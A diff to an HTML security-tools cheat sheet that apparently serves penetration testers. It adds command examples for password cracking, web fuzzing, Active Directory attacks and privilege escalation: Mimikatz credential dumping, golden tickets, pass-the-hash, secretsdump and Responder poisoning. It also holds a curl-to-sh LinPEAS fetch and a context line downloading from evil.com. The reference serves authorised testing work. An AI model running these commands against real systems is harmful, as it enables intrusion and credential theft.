@@ -271,6 +271,443 @@ webcam has_screenshot:true
         </div>
 
         <!-- Misc / SOC / Other Tools List -->
+
+        <!-- Password Cracking -->
+        <div class="tool-card" id="john" data-keywords="john ripper password cracker hash">
+            <div class="tool-header">
+                <h3 class="tool-title">John the Ripper</h3>
+                <span class="tool-category cat-exp">Cracking</span>
+            </div>
+            <div class="tool-desc">Fast password cracker supporting hundreds of hash types and ciphers.</div>
+            <div class="tool-flags">
+<strong># Crack with wordlist</strong>
+john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+
+<strong># Show cracked passwords</strong>
+john --show hash.txt
+
+<strong># Specify format</strong>
+john --format=NT hash.txt
+            </div>
+        </div>
+
+        <div class="tool-card" id="hashcat" data-keywords="hashcat gpu password cracker hash">
+            <div class="tool-header">
+                <h3 class="tool-title">Hashcat</h3>
+                <span class="tool-category cat-exp">Cracking</span>
+            </div>
+            <div class="tool-desc">World's fastest password recovery tool with GPU acceleration.</div>
+            <div class="tool-flags">
+<strong># Dictionary attack (mode 0)</strong>
+hashcat -m 1000 -a 0 hash.txt rockyou.txt
+
+<strong># Common hash modes</strong>
+-m 0    MD5
+-m 100  SHA1
+-m 1000 NTLM
+-m 1800 SHA-512 (Unix)
+-m 3200 bcrypt
+
+<strong># Show cracked</strong>
+hashcat --show hash.txt
+            </div>
+        </div>
+
+        <!-- Web Scanning -->
+        <div class="tool-card" id="ffuf" data-keywords="ffuf fuzz web directory brute force">
+            <div class="tool-header">
+                <h3 class="tool-title">ffuf</h3>
+                <span class="tool-category cat-web">Web</span>
+            </div>
+            <div class="tool-desc">Fast web fuzzer written in Go. Directory discovery, parameter fuzzing, vhost enumeration.</div>
+            <div class="tool-flags">
+<strong># Directory Fuzzing</strong>
+ffuf -u http://target/FUZZ -w wordlist.txt
+
+<strong># Subdomain Fuzzing</strong>
+ffuf -u http://FUZZ.target.com -w subdomains.txt -H "Host: FUZZ.target.com"
+
+<strong># POST Parameter Fuzzing</strong>
+ffuf -u http://target/login -X POST -d "user=admin&pass=FUZZ" -w passwords.txt
+
+<strong># Filter by status/size</strong>
+ffuf -u http://target/FUZZ -w list.txt -fc 404 -fs 1234
+            </div>
+        </div>
+
+        <div class="tool-card" id="nikto" data-keywords="nikto web scanner vulnerability">
+            <div class="tool-header">
+                <h3 class="tool-title">Nikto</h3>
+                <span class="tool-category cat-web">Web</span>
+            </div>
+            <div class="tool-desc">Web server scanner that tests for dangerous files, outdated software, and misconfigurations.</div>
+            <div class="tool-flags">
+<strong># Basic scan</strong>
+nikto -h http://target.com
+
+<strong># Scan specific port</strong>
+nikto -h target.com -p 8080
+
+<strong># Output to file</strong>
+nikto -h target.com -o report.html -Format htm
+            </div>
+        </div>
+
+        <div class="tool-card" id="wpscan" data-keywords="wpscan wordpress scanner vulnerability">
+            <div class="tool-header">
+                <h3 class="tool-title">WPScan</h3>
+                <span class="tool-category cat-web">Web</span>
+            </div>
+            <div class="tool-desc">WordPress security scanner. Detects vulnerable plugins, themes, and users.</div>
+            <div class="tool-flags">
+<strong># Basic scan</strong>
+wpscan --url http://target.com
+
+<strong># Enumerate users</strong>
+wpscan --url http://target.com -e u
+
+<strong># Enumerate plugins</strong>
+wpscan --url http://target.com -e ap --plugins-detection aggressive
+
+<strong># Password brute force</strong>
+wpscan --url http://target.com -U admin -P passwords.txt
+            </div>
+        </div>
+
+        <div class="tool-card" id="zap" data-keywords="owasp zap proxy web scanner">
+            <div class="tool-header">
+                <h3 class="tool-title">OWASP ZAP</h3>
+                <span class="tool-category cat-web">Web</span>
+            </div>
+            <div class="tool-desc">Open-source web application security scanner and proxy. Free alternative to Burp Suite Pro.</div>
+            <div class="tool-flags">
+<strong># Automated Scan (CLI)</strong>
+zap-cli quick-scan http://target.com
+
+<strong># Spider a site</strong>
+zap-cli spider http://target.com
+
+<strong># Active scan</strong>
+zap-cli active-scan http://target.com
+            </div>
+        </div>
+
+        <!-- Active Directory / Windows -->
+        <div class="tool-card" id="crackmapexec" data-keywords="crackmapexec netexec cme smb winrm ad">
+            <div class="tool-header">
+                <h3 class="tool-title">CrackMapExec / NetExec</h3>
+                <span class="tool-category cat-exp">AD/Windows</span>
+            </div>
+            <div class="tool-desc">Swiss army knife for pentesting Windows/Active Directory environments.</div>
+            <div class="tool-flags">
+<strong># Check credentials (SMB)</strong>
+crackmapexec smb 192.168.1.0/24 -u user -p password
+
+<strong># Pass-the-Hash</strong>
+crackmapexec smb target -u admin -H &lt;NTLM_hash&gt;
+
+<strong># Dump SAM</strong>
+crackmapexec smb target -u admin -p pass --sam
+
+<strong># Execute command</strong>
+crackmapexec smb target -u admin -p pass -x "whoami"
+            </div>
+        </div>
+
+        <div class="tool-card" id="impacket" data-keywords="impacket python smb wmi psexec secretsdump">
+            <div class="tool-header">
+                <h3 class="tool-title">Impacket</h3>
+                <span class="tool-category cat-exp">AD/Windows</span>
+            </div>
+            <div class="tool-desc">Collection of Python classes for working with network protocols. Essential for AD attacks.</div>
+            <div class="tool-flags">
+<strong># PSExec - Get shell</strong>
+psexec.py domain/user:password@target
+
+<strong># Dump secrets</strong>
+secretsdump.py domain/user:password@target
+
+<strong># WMI Exec</strong>
+wmiexec.py domain/user:password@target
+
+<strong># Get TGT (Kerberos)</strong>
+getTGT.py domain/user:password
+            </div>
+        </div>
+
+        <div class="tool-card" id="responder" data-keywords="responder llmnr nbt-ns poisoning">
+            <div class="tool-header">
+                <h3 class="tool-title">Responder</h3>
+                <span class="tool-category cat-exp">AD/Windows</span>
+            </div>
+            <div class="tool-desc">LLMNR, NBT-NS and MDNS poisoner. Capture NTLMv2 hashes on the network.</div>
+            <div class="tool-flags">
+<strong># Start Responder</strong>
+responder -I eth0 -rdwv
+
+<strong># Analyze mode (passive)</strong>
+responder -I eth0 -A
+            </div>
+        </div>
+
+        <div class="tool-card" id="evil-winrm" data-keywords="evil-winrm winrm powershell shell">
+            <div class="tool-header">
+                <h3 class="tool-title">Evil-WinRM</h3>
+                <span class="tool-category cat-exp">AD/Windows</span>
+            </div>
+            <div class="tool-desc">WinRM shell for hacking/pentesting. Feature-rich PowerShell remoting.</div>
+            <div class="tool-flags">
+<strong># Connect with password</strong>
+evil-winrm -i target -u user -p password
+
+<strong># Connect with hash (PTH)</strong>
+evil-winrm -i target -u admin -H &lt;NTLM_hash&gt;
+
+<strong># Upload/Download files</strong>
+upload /path/to/file
+download C:\file.txt
+            </div>
+        </div>
+
+        <div class="tool-card" id="mimikatz" data-keywords="mimikatz credentials dump lsass windows">
+            <div class="tool-header">
+                <h3 class="tool-title">Mimikatz</h3>
+                <span class="tool-category cat-exp">AD/Windows</span>
+            </div>
+            <div class="tool-desc">Extract plaintext passwords, hashes, PIN codes and Kerberos tickets from memory.</div>
+            <div class="tool-flags">
+<strong># Dump credentials</strong>
+privilege::debug
+sekurlsa::logonpasswords
+
+<strong># Dump SAM</strong>
+lsadump::sam
+
+<strong># Pass-the-Hash</strong>
+sekurlsa::pth /user:admin /domain:corp /ntlm:&lt;hash&gt;
+
+<strong># Golden Ticket</strong>
+kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-... /krbtgt:&lt;hash&gt;
+            </div>
+        </div>
+
+        <div class="tool-card" id="bloodhound" data-keywords="bloodhound active directory graph attack path">
+            <div class="tool-header">
+                <h3 class="tool-title">BloodHound</h3>
+                <span class="tool-category cat-exp">AD/Windows</span>
+            </div>
+            <div class="tool-desc">Active Directory attack path visualization. Find hidden relationships and privilege escalation paths.</div>
+            <div class="tool-flags">
+<strong># Collect data (SharpHound)</strong>
+SharpHound.exe -c All
+
+<strong># Python collector</strong>
+bloodhound-python -u user -p pass -d domain.local -ns &lt;DC_IP&gt;
+
+<strong># Import JSON to BloodHound GUI</strong>
+Upload the .zip file to BloodHound
+            </div>
+        </div>
+
+        <!-- Network Scanning -->
+        <div class="tool-card" id="masscan" data-keywords="masscan fast port scanner">
+            <div class="tool-header">
+                <h3 class="tool-title">Masscan</h3>
+                <span class="tool-category cat-net">Networking</span>
+            </div>
+            <div class="tool-desc">Internet-scale port scanner. Can scan the entire Internet in under 6 minutes.</div>
+            <div class="tool-flags">
+<strong># Scan common ports</strong>
+masscan -p80,443,8080 192.168.1.0/24 --rate=1000
+
+<strong># Scan all ports</strong>
+masscan -p0-65535 target --rate=10000
+
+<strong># Output to file</strong>
+masscan -p1-65535 target -oG results.txt
+            </div>
+        </div>
+
+        <div class="tool-card" id="rustscan" data-keywords="rustscan fast nmap port scanner">
+            <div class="tool-header">
+                <h3 class="tool-title">RustScan</h3>
+                <span class="tool-category cat-net">Networking</span>
+            </div>
+            <div class="tool-desc">Modern port scanner. Scans all 65k ports in seconds, then pipes to Nmap.</div>
+            <div class="tool-flags">
+<strong># Quick scan + Nmap</strong>
+rustscan -a target -- -sC -sV
+
+<strong># Scan specific ports</strong>
+rustscan -a target -p 80,443,8080
+
+<strong># Adjust batch size</strong>
+rustscan -a target -b 5000
+            </div>
+        </div>
+
+        <div class="tool-card" id="tcpdump" data-keywords="tcpdump packet capture network traffic">
+            <div class="tool-header">
+                <h3 class="tool-title">tcpdump</h3>
+                <span class="tool-category cat-net">Networking</span>
+            </div>
+            <div class="tool-desc">Command-line packet analyzer. Capture and analyze network traffic.</div>
+            <div class="tool-flags">
+<strong># Capture on interface</strong>
+tcpdump -i eth0
+
+<strong># Filter by host</strong>
+tcpdump -i eth0 host 192.168.1.10
+
+<strong># Filter by port</strong>
+tcpdump -i eth0 port 80
+
+<strong># Save to pcap</strong>
+tcpdump -i eth0 -w capture.pcap
+            </div>
+        </div>
+
+        <!-- Enumeration -->
+        <div class="tool-card" id="enum4linux" data-keywords="enum4linux smb enumeration windows shares">
+            <div class="tool-header">
+                <h3 class="tool-title">Enum4linux</h3>
+                <span class="tool-category cat-net">Enumeration</span>
+            </div>
+            <div class="tool-desc">Linux tool for enumerating information from Windows and Samba systems.</div>
+            <div class="tool-flags">
+<strong># Full enumeration</strong>
+enum4linux -a target
+
+<strong># Get users</strong>
+enum4linux -U target
+
+<strong># Get shares</strong>
+enum4linux -S target
+
+<strong># enum4linux-ng (newer)</strong>
+enum4linux-ng -A target
+            </div>
+        </div>
+
+        <div class="tool-card" id="amass" data-keywords="amass subdomain enumeration dns osint">
+            <div class="tool-header">
+                <h3 class="tool-title">Amass</h3>
+                <span class="tool-category cat-osint">OSINT</span>
+            </div>
+            <div class="tool-desc">In-depth attack surface mapping and asset discovery using OSINT.</div>
+            <div class="tool-flags">
+<strong># Passive enumeration</strong>
+amass enum -passive -d target.com
+
+<strong># Active enumeration</strong>
+amass enum -active -d target.com
+
+<strong># Brute force subdomains</strong>
+amass enum -brute -d target.com -w wordlist.txt
+            </div>
+        </div>
+
+        <div class="tool-card" id="nuclei" data-keywords="nuclei vulnerability scanner templates">
+            <div class="tool-header">
+                <h3 class="tool-title">Nuclei</h3>
+                <span class="tool-category cat-web">Scanning</span>
+            </div>
+            <div class="tool-desc">Fast vulnerability scanner based on templates. Thousands of community templates available.</div>
+            <div class="tool-flags">
+<strong># Scan with all templates</strong>
+nuclei -u http://target.com
+
+<strong># Scan with specific templates</strong>
+nuclei -u http://target.com -t cves/
+
+<strong># Scan list of URLs</strong>
+nuclei -l urls.txt -t technologies/
+
+<strong># Update templates</strong>
+nuclei -ut
+            </div>
+        </div>
+
+        <!-- Privilege Escalation -->
+        <div class="tool-card" id="linpeas" data-keywords="linpeas linux privilege escalation enumeration">
+            <div class="tool-header">
+                <h3 class="tool-title">LinPEAS</h3>
+                <span class="tool-category cat-exp">PrivEsc</span>
+            </div>
+            <div class="tool-desc">Linux Privilege Escalation Awesome Script. Comprehensive enumeration for privilege escalation vectors.</div>
+            <div class="tool-flags">
+<strong># Run from URL</strong>
+curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
+
+<strong># Run locally</strong>
+./linpeas.sh
+
+<strong># Fast mode</strong>
+./linpeas.sh -a
+            </div>
+        </div>
+
+        <div class="tool-card" id="winpeas" data-keywords="winpeas windows privilege escalation enumeration">
+            <div class="tool-header">
+                <h3 class="tool-title">WinPEAS</h3>
+                <span class="tool-category cat-exp">PrivEsc</span>
+            </div>
+            <div class="tool-desc">Windows Privilege Escalation Awesome Script. Find misconfigurations and escalation paths.</div>
+            <div class="tool-flags">
+<strong># Run executable</strong>
+winPEASx64.exe
+
+<strong># Run with all checks</strong>
+winPEASx64.exe -a
+
+<strong># Specific category</strong>
+winPEASx64.exe servicesinfo
+            </div>
+        </div>
+
+        <!-- Reverse Engineering -->
+        <div class="tool-card" id="radare2" data-keywords="radare2 r2 reverse engineering disassembler">
+            <div class="tool-header">
+                <h3 class="tool-title">Radare2</h3>
+                <span class="tool-category cat-for">Reversing</span>
+            </div>
+            <div class="tool-desc">Complete framework for reverse engineering. Disassembler, debugger, and binary analysis.</div>
+            <div class="tool-flags">
+<strong># Open binary</strong>
+r2 binary
+
+<strong># Analyze all</strong>
+aaa
+
+<strong># List functions</strong>
+afl
+
+<strong># Seek to main</strong>
+s main
+
+<strong># Print disassembly</strong>
+pdf
+            </div>
+        </div>
+
+        <div class="tool-card" id="binwalk" data-keywords="binwalk firmware extraction analysis">
+            <div class="tool-header">
+                <h3 class="tool-title">Binwalk</h3>
+                <span class="tool-category cat-for">Forensics</span>
+            </div>
+            <div class="tool-desc">Firmware analysis tool. Scan and extract embedded files and executable code.</div>
+            <div class="tool-flags">
+<strong># Scan file</strong>
+binwalk firmware.bin
+
+<strong># Extract files</strong>
+binwalk -e firmware.bin
+
+<strong># Entropy analysis</strong>
+binwalk -E firmware.bin
+            </div>
+        </div>
+
          <div class="tool-card" data-keywords="sysinternals procmon procexp autoruns windows">
             <div class="tool-header">
                 <h3 class="tool-title">Sysinternals Suite</h3>
@@ -310,19 +747,17 @@ Invoke-WebRequest -Uri "http://evil.com/file.exe" -OutFile "C:\Temp\file.exe"
             <div class="tool-desc">A software reverse engineering (SRE) suite of tools developed by NSA.</div>
         </div>
 
-        <!-- Add more placeholders for the massive list -->
-         <div class="tool-card" data-keywords="list of other tools unclassified">
+        <!-- Reference Card -->
+        <div class="tool-card" data-keywords="list quick reference">
             <div class="tool-header">
-                <h3 class="tool-title">Other Tools</h3>
+                <h3 class="tool-title">Quick Reference</h3>
                 <span class="tool-category cat-exp">Index</span>
             </div>
             <div class="tool-desc">
-                <p><strong>Networking:</strong> Socat, SSH, OpenVPN, TCPDump, TShark, Zeek, Snort, Suricata, Nagios, Zscaler, Proxmox, Kubernetes, Docker.</p>
-                <p><strong>Web:</strong> OWASP ZAP, Caido, WPScan, Feroxbuster, Dirb, Nikto, WhatWeb, ffuf, EvilGinx2, GoPhish.</p>
-                <p><strong>Enumeration:</strong> Masscan, RustScan, Enum4linux, AdGuard, DNSRecon, NSLookup, Dig, Whois, Amass.</p>
-                <p><strong>Exploitation:</strong> John the Ripper, Hashcat, CrackMapExec (NetExec), Evil-WinRM, Impacket, Responder, Mimikatz.</p>
-                <p><strong>Forensics:</strong> Rekall, GRR, KAPE, Zimmerman Tools, ExifTool, Binwalk, Strings, FLOSS, PEStudio, ProcMon.</p>
-                <p><strong>OSINT:</strong> Holehe, PhoneInfoga, Waybackurls, Gowitness.</p>
+                <p><strong>Network:</strong> Socat, SSH, OpenVPN, TShark, Zeek, Snort, Suricata</p>
+                <p><strong>Web:</strong> Caido, Feroxbuster, Dirb, WhatWeb, EvilGinx2, GoPhish</p>
+                <p><strong>Forensics:</strong> Rekall, GRR, KAPE, Zimmerman Tools, ExifTool, Strings, FLOSS, PEStudio</p>
+                <p><strong>OSINT:</strong> Holehe, PhoneInfoga, Waybackurls, Gowitness, SpiderFoot</p>
             </div>
         </div>
 
